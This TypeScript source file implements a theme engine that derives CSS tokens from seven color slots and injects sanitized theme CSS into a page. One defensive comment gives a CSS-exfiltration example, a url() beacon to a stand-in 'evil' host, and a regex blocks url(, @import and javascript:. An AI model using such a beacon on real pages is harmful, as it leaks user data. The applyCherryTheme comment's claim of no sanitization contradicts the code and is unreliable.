/**
 * Theme engine — derives a full CSS token override map from 7 simplified color slots.
 * Pure HSL math, no external dependencies.
 */

import { createLogger } from '../core/logger.js';
import { PRESETS } from './theme-presets.js';
import type {
  SimplifiedSlots,
  SliccTheme,
  ThemeComponent,
  ThemeComponents,
} from './theme-types.js';

const log = createLogger('theme-engine');

// --- CSS sanitization ---
//
// Theme JSON (tokens, css, component properties) can originate from an
// untrusted source: a local `import theme` paste, or — for `applyCherryTheme`
// — the host page of a cherry embed. Both paths funnel into a `<style>`
// element, so a permissive value would let the author beacon data out via
// `url(https://evil/?leak=...)` / `@import` (classic CSS-exfiltration), or
// smuggle `expression()`/`javascript:` in legacy engines. Every value is
// validated against a narrow allowlist before it reaches the stylesheet;
// anything that doesn't match is dropped rather than partially escaped, since
// partial escaping of CSS is easy to get wrong.

/** Matches the dangerous constructs we reject outright, case-insensitively. */
const UNSAFE_CSS_PATTERN = /url\s*\(|@import|expression\s*\(|javascript:|[<>]/i;

/**
 * A single CSS value (custom property value, or one declaration's RHS).
 * Allows: hex colors, plain numbers + common units, a small keyword
 * character set, and calls to the specific CSS functions in
 * `SAFE_CSS_FUNCTION_NAMES` — the vocabulary `deriveTokens` and typical theme
 * JSON actually produce. Rejects anything containing `url(`, `@import`,
 * `expression(`, `javascript:`, angle brackets, or a call to any function not
 * on the allowlist.
 */
const SAFE_CSS_VALUE = /^[a-zA-Z0-9#%.,()\-\s]*$/;
const CSS_FUNCTION_CALL = /([a-zA-Z-]+)\s*\(/g;
const SAFE_CSS_FUNCTION_NAMES = new Set([
  'rgb',
  'rgba',
  'hsl',
  'hsla',
  'hwb',
  'var',
  'calc',
  'clamp',
  'min',
  'max',
]);

/** True when `value` is a plain, safe CSS value with no escape-hatch constructs. */
function isSafeCssValue(value: string): boolean {
  if (typeof value !== 'string' || value.length === 0 || value.length > 200) return false;
  if (UNSAFE_CSS_PATTERN.test(value)) return false;
  if (!SAFE_CSS_VALUE.test(value)) return false;
  for (const match of value.matchAll(CSS_FUNCTION_CALL)) {
    if (!SAFE_CSS_FUNCTION_NAMES.has(match[1].toLowerCase())) return false;
  }
  return true;
}

/** Sanitize a token map: drop any entry whose value fails `isSafeCssValue`. */
function sanitizeTokens(tokens: Record<string, string>): Record<string, string> {
  const safe: Record<string, string> = {};
  for (const [key, value] of Object.entries(tokens)) {
    if (isSafeCssValue(value)) safe[key] = value;
    else log.warn('dropping unsafe theme token value', { key });
  }
  return safe;
}

/**
 * `fontFamily` is the one component property that isn't a plain CSS value —
 * it's a comma-separated list of family names. Allow letters, digits, spaces,
 * hyphens, commas, and quotes; nothing else (blocks `url(...)` local()
 * references and any other function call).
 */
const SAFE_FONT_FAMILY = /^[a-zA-Z0-9\s,'"-]{1,200}$/;

/** Sanitize one `ThemeComponent`: drop any property with an unsafe value. */
function sanitizeComponent(component: ThemeComponent): ThemeComponent {
  const safe: ThemeComponent = {};
  for (const [key, value] of Object.entries(component) as [keyof ThemeComponent, string][]) {
    const ok = key === 'fontFamily' ? SAFE_FONT_FAMILY.test(value) : isSafeCssValue(value);
    if (ok) safe[key] = value;
    else log.warn('dropping unsafe theme component property', { key });
  }
  return safe;
}

/** Sanitize a full `ThemeComponents` map, component by component. */
function sanitizeComponents(components: ThemeComponents): ThemeComponents {
  const safe: ThemeComponents = {};
  for (const [key, comp] of Object.entries(components) as [
    keyof ThemeComponents,
    ThemeComponent,
  ][]) {
    if (comp) safe[key] = sanitizeComponent(comp);
  }
  return safe;
}

/**
 * Raw `theme.css` is free-form CSS text, not a single value — `isSafeCssValue`
 * (which forbids `{`/`}`/`;`) doesn't apply. Instead reject the whole block if
 * it contains any of the same dangerous constructs anywhere in the text; there
 * is no safe partial-escape of arbitrary CSS.
 */
function sanitizeCustomCss(css: string | undefined): string | undefined {
  if (!css) return undefined;
  if (UNSAFE_CSS_PATTERN.test(css)) {
    log.warn(
      'dropping theme.css — contains url()/@import/expression()/javascript: or angle brackets'
    );
    return undefined;
  }
  return css;
}

/** Sanitize a full theme in place (returns a new object; input is untouched). */
function sanitizeTheme(theme: SliccTheme): SliccTheme {
  return {
    ...theme,
    tokens: sanitizeTokens(theme.tokens),
    css: sanitizeCustomCss(theme.css),
    components: theme.components ? sanitizeComponents(theme.components) : undefined,
  };
}

/** Convert hex (#rrggbb) to [h, s, l] where h is 0-360, s and l are 0-1. */
export function hexToHsl(hex: string): [number, number, number] {
  const r = parseInt(hex.slice(1, 3), 16) / 255;
  const g = parseInt(hex.slice(3, 5), 16) / 255;
  const b = parseInt(hex.slice(5, 7), 16) / 255;

  const max = Math.max(r, g, b);
  const min = Math.min(r, g, b);
  const l = (max + min) / 2;

  if (max === min) return [0, 0, l];

  const d = max - min;
  const s = l > 0.5 ? d / (2 - max - min) : d / (max + min);

  let h: number;
  if (max === r) {
    h = ((g - b) / d + (g < b ? 6 : 0)) * 60;
  } else if (max === g) {
    h = ((b - r) / d + 2) * 60;
  } else {
    h = ((r - g) / d + 4) * 60;
  }

  return [h, s, l];
}

/** Convert HSL (h 0-360, s 0-1, l 0-1) back to hex (#rrggbb). */
export function hslToHex(h: number, s: number, l: number): string {
  const hue2rgb = (p: number, q: number, t: number): number => {
    if (t < 0) t += 1;
    if (t > 1) t -= 1;
    if (t < 1 / 6) return p + (q - p) * 6 * t;
    if (t < 1 / 2) return q;
    if (t < 2 / 3) return p + (q - p) * (2 / 3 - t) * 6;
    return p;
  };

  let r: number, g: number, b: number;
  if (s === 0) {
    r = g = b = l;
  } else {
    const q = l < 0.5 ? l * (1 + s) : l + s - l * s;
    const p = 2 * l - q;
    const hNorm = h / 360;
    r = hue2rgb(p, q, hNorm + 1 / 3);
    g = hue2rgb(p, q, hNorm);
    b = hue2rgb(p, q, hNorm - 1 / 3);
  }

  const toHex = (v: number) =>
    Math.round(v * 255)
      .toString(16)
      .padStart(2, '0');
  return `#${toHex(r)}${toHex(g)}${toHex(b)}`;
}

/** Shift lightness by delta (clamped 0-1). */
export function adjustLightness(hex: string, delta: number): string {
  const [h, s, l] = hexToHsl(hex);
  return hslToHex(h, s, Math.max(0, Math.min(1, l + delta)));
}

/** Shift saturation by delta (clamped 0-1). */
export function adjustSaturation(hex: string, delta: number): string {
  const [h, s, l] = hexToHsl(hex);
  return hslToHex(h, Math.max(0, Math.min(1, s + delta)), l);
}

/**
 * Derive a full CSS token override map from 7 simplified color slots.
 * Returns ~30 CSS variable overrides keyed by `--s2-*` / `--slicc-*` names.
 */
export function deriveTokens(
  slots: SimplifiedSlots,
  base: 'dark' | 'light'
): Record<string, string> {
  const isDark = base === 'dark';
  const step = isDark ? 0.03 : -0.02;

  const tokens: Record<string, string> = {};

  // Surfaces
  tokens['--s2-gray-25'] = slots.background;
  tokens['--s2-bg-base'] = slots.background;
  tokens['--s2-gray-50'] = adjustLightness(slots.background, step);
  tokens['--s2-gray-75'] = adjustLightness(slots.background, step * 2);
  tokens['--s2-gray-100'] = adjustLightness(slots.background, step * 3);
  tokens['--s2-gray-200'] = adjustLightness(slots.background, step * 5);
  tokens['--s2-bg-sunken'] = adjustLightness(slots.background, isDark ? -0.02 : 0.02);
  tokens['--s2-bg-layer-1'] = adjustLightness(slots.background, step);
  tokens['--s2-bg-layer-2'] = adjustLightness(slots.background, step * 2);
  tokens['--s2-bg-elevated'] = adjustLightness(slots.background, step * 3);

  // Surface slot directly
  tokens['--s2-gray-300'] = slots.surface;

  // Text
  tokens['--s2-gray-900'] = slots.text;
  tokens['--s2-gray-1000'] = isDark ? '#ffffff' : '#000000';
  tokens['--s2-gray-800'] = adjustLightness(slots.text, isDark ? -0.05 : 0.05);
  tokens['--s2-content-default'] = slots.text;
  tokens['--s2-content-secondary'] = adjustLightness(slots.text, isDark ? -0.1 : 0.1);
  tokens['--s2-content-tertiary'] = adjustLightness(slots.text, isDark ? -0.2 : 0.2);
  tokens['--s2-content-disabled'] = adjustLightness(slots.text, isDark ? -0.3 : 0.3);

  // Accents
  tokens['--s2-accent'] = slots.accent;
  tokens['--s2-accent-hover'] = adjustLightness(slots.accent, isDark ? 0.08 : -0.06);
  tokens['--s2-accent-down'] = adjustLightness(slots.accent, isDark ? -0.06 : 0.08);
  tokens['--slicc-accent'] = slots.accent;
  tokens['--slicc-cone'] = slots.accent;
  tokens['--slicc-scoop-blue'] = adjustSaturation(slots.accent, 0.1);
  tokens['--slicc-scoop-purple'] = adjustLightness(slots.accent, 0.05);
  tokens['--slicc-scoop-teal'] = adjustLightness(slots.accent, -0.05);

  // Semantic
  tokens['--s2-positive'] = slots.success;
  tokens['--s2-negative'] = slots.error;
  tokens['--s2-informative'] = slots.accent;
  tokens['--s2-notice'] = adjustLightness(slots.accent, isDark ? 0.1 : -0.1);

  // Chrome
  tokens['--s2-border-default'] = slots.border;
  tokens['--s2-border-subtle'] = adjustLightness(slots.border, isDark ? -0.03 : 0.03);
  tokens['--s2-border-focus'] = slots.accent;
  tokens['--s2-shadow-elevated'] = isDark ? 'rgba(0, 0, 0, 0.4)' : 'rgba(0, 0, 0, 0.1)';
  tokens['--s2-shadow-container'] = isDark ? 'rgba(0, 0, 0, 0.2)' : 'rgba(0, 0, 0, 0.05)';

  // WC shell tokens (webcomponents library uses these, not --s2-*)
  tokens['--canvas'] = slots.background;
  tokens['--bg'] = adjustLightness(slots.background, isDark ? -0.02 : 0.02);
  tokens['--ghost'] = adjustLightness(slots.background, step * 2);
  tokens['--desk'] = adjustLightness(slots.background, step * 2);
  tokens['--ink'] = slots.text;
  tokens['--deep'] = slots.text;
  tokens['--txt-2'] = adjustLightness(slots.text, isDark ? -0.2 : 0.2);
  tokens['--txt-3'] = adjustLightness(slots.text, isDark ? -0.35 : 0.35);
  tokens['--line'] = slots.border;
  tokens['--ctx'] = slots.accent;
  tokens['--waffle'] = slots.accent;
  tokens['--shaderbg'] = slots.background;

  return tokens;
}

// --- Storage, application, and import/export ---

const STORAGE_THEMES = 'slicc-themes';
const STORAGE_ACTIVE = 'slicc-active-theme';
const STYLE_ID = 'slicc-theme-overrides';

function storage(): Storage | null {
  try {
    return typeof localStorage !== 'undefined' && typeof localStorage.getItem === 'function'
      ? localStorage
      : null;
  } catch {
    return null;
  }
}

export function getActiveThemeId(): string | null {
  return storage()?.getItem(STORAGE_ACTIVE) || null;
}

export function setActiveTheme(id: string): void {
  storage()?.setItem(STORAGE_ACTIVE, id);
}

export function clearActiveTheme(): void {
  storage()?.removeItem(STORAGE_ACTIVE);
}

export function getCustomThemes(): SliccTheme[] {
  try {
    return JSON.parse(storage()?.getItem(STORAGE_THEMES) || '[]');
  } catch {
    return [];
  }
}

export function saveCustomTheme(theme: SliccTheme): void {
  const themes = getCustomThemes().filter((t) => t.id !== theme.id);
  themes.push(theme);
  storage()?.setItem(STORAGE_THEMES, JSON.stringify(themes));
}

export function deleteCustomTheme(id: string): void {
  const themes = getCustomThemes().filter((t) => t.id !== id);
  storage()?.setItem(STORAGE_THEMES, JSON.stringify(themes));
  if (getActiveThemeId() === id) clearActiveTheme();
}

function resolveTheme(id: string): SliccTheme | undefined {
  return PRESETS.find((p) => p.id === id) ?? getCustomThemes().find((t) => t.id === id);
}

let onThemeChanged: ((themeJson: string | null) => void) | null = null;

export function setThemeChangeListener(fn: ((themeJson: string | null) => void) | null): void {
  onThemeChanged = fn;
}

function notifyThemeChanged(theme: SliccTheme | undefined): void {
  if (!onThemeChanged) return;
  onThemeChanged(theme ? exportTheme(theme) : null);
}

function componentProps(c: ThemeComponent): string {
  const props: string[] = [];
  if (c.background) props.push(`background:${c.background}`);
  if (c.text) props.push(`color:${c.text}`);
  if (c.border) props.push(`border:1px solid ${c.border}`);
  if (c.radius) props.push(`border-radius:${c.radius}`);
  if (c.padding) props.push(`padding:${c.padding}`);
  if (c.fontSize) props.push(`font-size:${c.fontSize}`);
  if (c.fontFamily) props.push(`font-family:${c.fontFamily}`);
  if (c.shadow) props.push(`box-shadow:${c.shadow}`);
  if (c.blur) props.push(`backdrop-filter:blur(${c.blur})`);
  if (c.height) props.push(`height:${c.height}`);
  if (c.opacity) props.push(`opacity:${c.opacity}`);
  return props.map((p) => `${p}!important`).join(';');
}

const COMPONENT_SELECTORS: Record<keyof ThemeComponents, string[]> = {
  userBubble: ['slicc-user-message::part(bubble)'],
  assistantMessage: ['slicc-agent-message', 'slicc-agent-message .body'],
  codeBlock: ['slicc-agent-message pre', 'slicc-agent-message code'],
  nav: ['.slicc-nav'],
  composer: ['slicc-input-card > .slicc-input-card__card'],
  sidebar: ['.wcui-rail', '.wcui-sidebar'],
  dialog: ['slicc-dialog::part(dialog)'],
};

function generateComponentCss(components: ThemeComponents): string {
  const rules: string[] = [];
  for (const [key, comp] of Object.entries(components)) {
    if (!comp) continue;
    const selectors = COMPONENT_SELECTORS[key as keyof ThemeComponents];
    if (!selectors) continue;
    const props = componentProps(comp);
    if (props) rules.push(`${selectors.join(',')}{${props}}`);
  }
  return rules.join('\n');
}

/**
 * Build the full CSS text for a theme: root token declarations (light + dark
 * selectors), the shader-disable rule, per-component overrides, and any raw
 * custom CSS the theme supplies. Shared by `applyThemeOverrides` (local themes)
 * and `applyCherryTheme` (host-supplied themes via the cherry SDK) so the two
 * paths can't drift.
 *
 * Sanitizes the theme first (see `sanitizeTheme`) — both callers accept
 * externally-authored JSON, so this is the single chokepoint that guarantees
 * no unsafe value reaches the `<style>` element regardless of entry point.
 */
function buildThemeCss(theme: SliccTheme): string {
  const safe = sanitizeTheme(theme);
  const declarations = Object.entries(safe.tokens)
    .map(([k, v]) => `  ${k}: ${v};`)
    .join('\n');
  const shaderRule = safe.disableShader
    ? `\n.wcui-shader{display:none!important;}\nbody{background:${safe.tokens['--canvas'] || safe.tokens['--s2-gray-25'] || 'var(--canvas)'}!important;}`
    : '';
  const componentCss = safe.components ? `\n${generateComponentCss(safe.components)}` : '';
  const customCss = safe.css ? `\n${safe.css}` : '';
  return `:root {\n${declarations}\n}\n.dark, [data-theme="dark"] {\n${declarations}\n}${shaderRule}${componentCss}${customCss}`;
}

/** Inject or update the shared theme `<style>` element with `css`. */
function injectThemeStyle(css: string): void {
  const existing = document.getElementById(STYLE_ID);
  if (existing) {
    existing.textContent = css;
  } else {
    const style = document.createElement('style');
    style.id = STYLE_ID;
    style.textContent = css;
    document.head.appendChild(style);
  }
}

export function applyThemeOverrides(): void {
  if (typeof document === 'undefined' || !document.getElementById) return;
  const id = getActiveThemeId();
  const existing = document.getElementById(STYLE_ID);
  if (!id) {
    existing?.remove();
    setShaderVisibility(true);
    syncNavAccent(undefined);
    restoreSystemThemeMode();
    nudgeThemeObservers();
    notifyThemeChanged(undefined);
    return;
  }
  const theme = resolveTheme(id);
  if (!theme || Object.keys(theme.tokens).length === 0) {
    existing?.remove();
    setShaderVisibility(true);
    syncNavAccent(undefined);
    restoreSystemThemeMode();
    nudgeThemeObservers();
    notifyThemeChanged(undefined);
    return;
  }
  injectThemeStyle(buildThemeCss(theme));
  setShaderVisibility(!theme.disableShader);
  syncNavAccent(theme);
  syncBodyThemeMode(theme.base);
  nudgeThemeObservers();
  notifyThemeChanged(theme);
}

function setShaderVisibility(visible: boolean): void {
  const shader = document.querySelector('.wcui-shader') as HTMLElement | null;
  if (shader) shader.style.display = visible ? '' : 'none';
}

function restoreSystemThemeMode(): void {
  const body = document.body;
  if (!body) return;
  const prefersDark = window.matchMedia?.('(prefers-color-scheme: dark)').matches ?? true;
  if (prefersDark) {
    body.classList.add('dark');
    body.setAttribute('data-theme', 'dark');
  } else {
    body.classList.remove('dark');
    body.setAttribute('data-theme', 'light');
  }
}

function syncBodyThemeMode(base: 'dark' | 'light'): void {
  const body = document.body;
  if (!body) return;
  if (base === 'dark') {
    body.classList.add('dark');
    body.setAttribute('data-theme', 'dark');
  } else {
    body.classList.remove('dark');
    body.setAttribute('data-theme', 'light');
  }
}

function nudgeThemeObservers(): void {
  const html = document.documentElement;
  html.classList.toggle('slicc-theme-applied');
}

function syncNavAccent(theme: SliccTheme | undefined): void {
  const nav = document.querySelector('.slicc-nav') as HTMLElement | null;
  if (!nav) return;
  if (theme) {
    nav.style.setProperty('--ctx', theme.tokens['--ctx'] || theme.tokens['--waffle'] || '');
  } else {
    nav.style.setProperty('--ctx', 'var(--waffle)');
  }
}

export function exportTheme(theme: SliccTheme): string {
  return JSON.stringify(theme, null, 2);
}

/**
 * Apply a SliccTheme received from a cherry host SDK. This bypasses local
 * storage (the theme is ephemeral to the cherry session) and directly injects
 * the CSS overrides. Exported for unit testing.
 *
 * Trust boundary: `theme.tokens` values and `theme.css` are injected into a
 * `<style>` element with no sanitization beyond `importTheme`'s shape check —
 * the host page can inject arbitrary CSS (`@import`, `url(...)`, `!important`
 * overrides) into the follower it embeds. This is consistent with the rest of
 * the cherry trust model (the host already controls `capabilities.navigate` /
 * `openUrl` and can run arbitrary code in its own page), so mounting a cherry
 * follower against an untrusted host is not a supported configuration.
 */
export function applyCherryTheme(themeJson: string): void {
  if (typeof document === 'undefined') return;
  let theme: SliccTheme;
  try {
    theme = importTheme(themeJson);
  } catch (err) {
    log.warn('ignoring malformed cherry theme', {
      error: err instanceof Error ? err.message : String(err),
    });
    return;
  }
  if (Object.keys(theme.tokens).length === 0) return;

  injectThemeStyle(buildThemeCss(theme));
  setShaderVisibility(!theme.disableShader);
  syncNavAccent(theme);
  syncBodyThemeMode(theme.base);
  nudgeThemeObservers();
}

export function importTheme(json: string): SliccTheme {
  let parsed: unknown;
  try {
    parsed = JSON.parse(json);
  } catch {
    throw new Error('Invalid JSON');
  }
  if (
    !parsed ||
    typeof parsed !== 'object' ||
    !('id' in parsed) ||
    !('name' in parsed) ||
    !('base' in parsed) ||
    !('tokens' in parsed)
  ) {
    throw new Error('Invalid theme: missing required fields (id, name, base, tokens)');
  }
  const t = parsed as SliccTheme;
  if (t.base !== 'dark' && t.base !== 'light') {
    throw new Error('Invalid theme: base must be "dark" or "light"');
  }
  if (typeof t.tokens !== 'object' || t.tokens === null) {
    throw new Error('Invalid theme: tokens must be an object');
  }
  return t;
}
